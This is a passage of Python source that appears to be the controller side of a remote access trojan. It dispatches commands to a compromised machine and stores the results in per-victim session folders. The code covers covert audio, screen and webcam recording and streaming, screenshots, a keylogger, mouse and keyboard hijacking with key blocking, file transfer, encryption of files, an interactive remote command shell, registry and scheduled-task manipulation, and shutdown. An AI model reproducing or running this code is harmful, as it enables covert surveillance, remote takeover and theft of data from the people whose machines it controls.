            if app_task := search(r'^app -n (\S?.+)', command).group(1):
                send_msg(client, f'app -n {app_task}')
                print(receive_msg(client))

                return
        except: ...

        try:
            if app_name := search(r'^app (-b|-d) (\S?.+)', command).group(1, 2):
                send_msg(client, f'app {app_name[0]} {app_name[-1]}') 
                
                if 'An error occurred in app' in (app_name_error := receive_msg(client)): 
                    print(app_name_error)

                return
        except: ...

        try:
            if app_mode := search(r'^app (-l -e|-r -e|-l -b|-r -b)', command).group(1):
                send_msg(client, f'app {app_mode}') 

                if (app_mode_error := receive_msg(client)) != 'completed': 
                    print(app_mode_error)

                return
        except: ...

    elif 'time' in command:
        try:
            if search(r'^time (-g)', command).group(1):
                send_msg(client, 'time -g')
                print(receive_msg(client))

                return
        except: ...

        try:
            if new_time := search(r'^time -c (\S?.+)', command).group(1):
                send_msg(client, f'time -c {new_time}')
                print(receive_msg(client))

                return
        except: ...

    elif 'date' in command:
        try:
            if search(r'^date (-g)', command).group(1):
                send_msg(client, 'date -g')
                print(receive_msg(client))

                return
        except: ...

        try:
            if new_date := search(r'^date -c (\S?.+)', command).group(1):
                send_msg(client, f'date -c {new_date}')
                print(receive_msg(client))  

                return
        except: ...  

    elif 'play' in command:
        try:
            if play_seconds := search(r'^play (-a|-v|-w) -s (\d+)', command).group(1, 2):
                match play_seconds[0]:
                    case '-a': 
                        print('Start recording audio [*]')      
                    case '-v':
                        print('Start recording screen [*]')
                    case _: 
                        print('Start recording webcam [*]')
                
                send_msg(client, f'play {play_seconds[0]} -s {play_seconds[-1]}')
                print(receive_msg(client))       

                return
        except: ...

        try:
            if play_get := search(r'^play (-a|-v|-w) -g', command).group(1):
                match play_get:
                    case '-a': 
                        audio_file_path = create_file_path('audio') + '.mp3'

                        send_msg(client, 'play -a -g')  
                        
                        if 'Audio recording not received'.encode() in (audio_data := receive_msg(client, flag=True)): 
                            print(audio_data.decode())
                        else:
                            with open(f'session_{client_ip}/records/audio/{audio_file_path}', 'wb') as audio_mp3: 
                                audio_mp3.write(audio_data) 

                            print(f'session_{client_ip}/records/audio/{audio_file_path} [+]')
                    case '-v':
                        screen_file_path = create_file_path('screen') + '.mp4'
                        send_msg(client, 'play -v -g')  

                        if 'Screen recording not received'.encode() in (screen_data := receive_msg(client,flag=True)): 
                            print(screen_data.decode())
                        else:
                            with open(f'session_{client_ip}/records/screen/{screen_file_path}', 'wb') as screen_mp4: 
                                screen_mp4.write(screen_data) 
                            
                            print(f'session_{client_ip}/records/screen/{screen_file_path} [+]')
                    case _:
                        webcam_file_path = create_file_path('webcam') + '.mp4'
                        send_msg(client, 'play -w -g')  

                        if 'Webcam recording not received'.encode() in (webcam_data := receive_msg(client, flag=True)): 
                            print(webcam_data.decode())
                        else:
                            with open(f'session_{client_ip}/records/webcam/{webcam_file_path}', 'wb') as webcam_mp4: 
                                webcam_mp4.write(webcam_data) 

                            print(f'session_{client_ip}/records/webcam/{webcam_file_path} [+]')

                return
        except: ...

        try: 
            if play_audio := search(r'^play -a (\S?.+)', command).group(1):
                send_msg(client, f'play -a {play_audio}') 
                
                if 'An error occurred in play' in (play_audio_error := receive_msg(client)):
                    print(play_audio_error)  

                return
        except: ...

    elif 'mouse' in command:
        try:
            if search(r'^mouse (-g)', command).group(1):
                send_msg(client, 'mouse -g')
                print(receive_msg(client)) 

                return
        except: ...

        try:
            if mouse_movement := search(r'^mouse -x (?P<x>\d+) -y (?P<y>\d+) -i (?P<interval>\S+)', command).groupdict():
                send_msg(client, f'mouse -x {mouse_movement["x"]} -y {mouse_movement["y"]} -i {mouse_movement["interval"]}') 
                
                if 'An error occurred in mouse' in (mouse_movement_error := receive_msg(client)): 
                    print(mouse_movement_error) 

                return
        except: ...

        try:
            if mouse_clicks := search(r'^mouse -c (?P<clicks>\d+) -i (?P<interval>\S+) (?P<button>-l|-r)', command).groupdict():
                send_msg(client, f'mouse -c {mouse_clicks["clicks"]} -i {mouse_clicks["interval"]} {mouse_clicks["button"]}') 
                
                if 'An error occurred in mouse' in (mouse_clicks_error := receive_msg(client)): 
                    print(mouse_clicks_error)

                return
        except: ...

        try:
            if mouse_scroll := search(r'^mouse -s (\d+|-\d+)', command).group(1):
                send_msg(client, f'mouse -s {mouse_scroll}') 

                if 'An error occurred in mouse' in (mouse_scroll_error := receive_msg(client)): 
                    print(mouse_scroll_error)   

                return
        except: ...

    elif 'keyboard' in command:
        try:
            if keyboard_write := search(r'^keyboard -t (?P<text>\S?.+) -i (?P<interval>\S+)', command).groupdict():
                send_msg(client, f'keyboard -t {keyboard_write["text"]} -i {keyboard_write["interval"]}') 
                
                if 'An error occurred in keyboard' in (keyboard_write_error := receive_msg(client)): 
                    print(keyboard_write_error)  

                return
        except: ...

        try:
            if keyboard_key := search(r'^keyboard -k (?P<key>\S?.+) -p (?P<presses>\d+) -i (?P<interval>\S+)', command).groupdict():
                send_msg(client, f'keyboard -k {keyboard_key["key"]} -p {keyboard_key["presses"]} -i {keyboard_key["interval"]}') 
               
                if 'An error occurred in keyboard' in (keyboard_key_error := receive_msg(client)): 
                    print(keyboard_key_error)   

                return
        except: ...

        try:
            if keyboard_hold_key := search(r'^keyboard -d (?P<key>\S?.+) -s (?P<second>\S+)', command).groupdict():
                send_msg(client, f'keyboard -d {keyboard_hold_key["key"]} -s {keyboard_hold_key["second"]}') 
                
                if 'An error occurred in keyboard' in (keyboard_hold_key_error := receive_msg(client)): 
                    print(keyboard_hold_key_error)   

                return
        except: ...

        try:
            if keyboard_remap_key := search(r'^keyboard -c (?P<key_type>-k|-h) (?P<key_from>\S?.+) -t (?P<key_to>\S?.+)', command).groupdict():
                send_msg(client, f'keyboard -c {keyboard_remap_key["key_type"]} {keyboard_remap_key["key_from"]} -t {keyboard_remap_key["key_to"]}') 
                
                if 'An error occurred in keyboard' in (keyboard_remap_key_error := receive_msg(client)): 
                    print(keyboard_remap_key_error) 

                return
        except: ...

        try:
            if keyboard_hotkey_or_block_key := search(r'^keyboard (-h|-b) (\S?.+)', command).group(1, 2):
                send_msg(client, f'keyboard {keyboard_hotkey_or_block_key[0]} {keyboard_hotkey_or_block_key[-1]}') 
               
                if 'An error occurred in keyboard' in (keyboard_hotkey_or_block_key_error := receive_msg(client)): 
                    print(keyboard_hotkey_or_block_key_error)

                return
        except: ...

        try:
            if search(r'^keyboard (-r)', command).group(1):
                send_msg(client, 'keyboard -r') 
                
                if 'An error occurred in keyboard' in (keyboard_unblock_error := receive_msg(client)): 
                    print(keyboard_unblock_error)

                return
        except: ...

    match command:
        case '': 
            send_msg(client, 'empty')
        case 'author': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'help': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'clear': 
            clear_output()
            send_msg(client, 'clear')
        case 'module': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'session': 
            send_msg(client, command)
            receive_msg(client)
            print(about_session)
        case 'sessions': 
            flag_search_sessions = True
            send_msg(client, 'exit')
            raise ConnectionError 
        case 'accounts': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'getuid': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'getpid': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'exit': 
            ctrl_c(client, mode=1)
            send_msg(client, 'continue session')          
        case 'pwd': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'cd': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'ls': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'hide': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'unhide': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'mkdir': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'mkfile': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'rn': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'rmdir': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'rm': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'cp': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'mv': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'download': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'upload': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'encrypt': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'decrypt': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'netsh': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'network': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'ipconfig': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'route': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'arp': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'netstat': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'site': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'device': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'buffer': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'systeminfo': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'services': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'tasks': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'startup': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'paths': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'app': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'ps': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'kill': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'cmd': 
            send_msg(client, command)

            while True:
                try:
                    send_msg(client, '__CMD_SESSION__')

                    try: 
                        cmd_command = input(receive_msg(client)).strip()
                    except KeyboardInterrupt: 
                        send_msg(client, 'exit')
                        print()
                        
                        return
                    except:
                        send_msg(client, 'empty')
                        continue

                    try:
                        if cd_cmd_path := search(r'^cd (\S?.+)', command).group(1): 
                            send_msg(client, f'cd {cd_cmd_path}')
                            continue
                    except: ...

                    match cmd_command:
                        case 'exit': 
                            send_msg(client, 'exit')
                            return
                        case '': 
                            send_msg(client, 'empty')
                            continue
                        case 'cls' | 'clear': 
                            clear_output()
                            send_msg(client, 'clear')
                            continue
                        case _: 
                            send_msg(client, cmd_command)
                            print(receive_msg(client)) 
                except ConnectionError: 
                    raise ConnectionError
                except: 
                    continue
        case 'reg': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'sc': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'schtasks':
            send_msg(client, command)
            print(receive_msg(client))
        case 'secedit':
            send_msg(client, command)
            print(receive_msg(client))
        case 'wmic':
            send_msg(client, command)
            print(receive_msg(client))
        case 'winmgmt':
            send_msg(client, command)
            print(receive_msg(client))
        case 'user': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'time': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'date': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'reboot': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'shutdown': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'screenshare': 
            try: 
                send_msg(client, 'screenshare')
                share(client, client_ip, 'screenshare')
            except BaseException as error: 
                print(f'Why: An error occurred in screenshare\nType: {type(error).__name__}\nDescription: {error}')
        case 'screenshot':
            try: 
                send_msg(client, command)
                screenshot_data = receive_msg(client, flag=True)

                if ('Screenshot not taken'.encode() in screenshot_data
                ) or ('An error occurred in screenshot'.encode() in screenshot_data): 
                    print(screenshot_data.decode())
                else:
                    screenshot_path = create_file_path('screenshot') + '.png'

                    with open(f'session_{client_ip}/screenshots/{screenshot_path}', 'wb') as screenshot_png: 
                        screenshot_png.write(screenshot_data) 

                    print(f'session_{client_ip}/screenshots/{screenshot_path} [+]')
            except BaseException as error: 
                print(f'Why: An error occurred in screenshot\nType: {type(error).__name__}\nDescription: {error}')
        case 'webcamshare': 
            try: 
                send_msg(client, 'webcamshare')
                share(client, client_ip, 'webcamshare')
            except BaseException as error:
                print(f'Why: An error occurred in webcamshare\nType: {type(error).__name__}\nDescription: {error}')           
        case 'screenshot_webcam': 
            try: 
                send_msg(client, command)
                screenshot_webcam_data = receive_msg(client,flag=True)

                if ('Webcam screenshot not taken'.encode() in screenshot_webcam_data
                ) or ('An error occurred in screenshot_webcam'.encode() in screenshot_webcam_data): 
                    print(screenshot_webcam_data.decode())
                else:
                    screenshot_webcam_path = create_file_path('screenshot_webcam') + '.png'

                    with open(f'session_{client_ip}/screenshots/{screenshot_webcam_path}', 'wb') as screenshot_webcam_png:
                        screenshot_webcam_png.write(screenshot_webcam_data) 
                    
                    print(f'session_{client_ip}/screenshots/{screenshot_webcam_path} [+]') 
            except BaseException as error: 
                print(f'Why: An error occurred in screenshot_webcam\nType: {type(error).__name__}\nDescription: {error}')
        case 'audioshare':
            try: 
                send_msg(client, 'audioshare')
                share(client, client_ip, 'audioshare', mode=1)
            except BaseException as error: 
                print(f'Why: An error occurred in audioshare\nType: {type(error).__name__}\nDescription: {error}')           
        case 'play': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'mouse': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'keyboard': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'keylogger': 
            send_msg(client, command)
            print(receive_msg(client))
        case 'show': 
            send_msg(client, command)
            print(receive_msg(client))
        case _: 
            print(f'Command not found --> {command}')
            send_msg(client, 'Command not found')


def main():
    try:
        init()
    except:
        raise SystemError('Initialization failed')

    while True:
        try: 
            search_sessions()
        except BaseException as error:
            try: 
                clear_output()
                print(f'Why: An error occurred in {__name__}\nType: {type(error).__name__}\nDescription: {error}')
                sleep(5)
                clear_output()
            except KeyboardInterrupt: 
                ctrl_c()
            except: 
                continue 


main()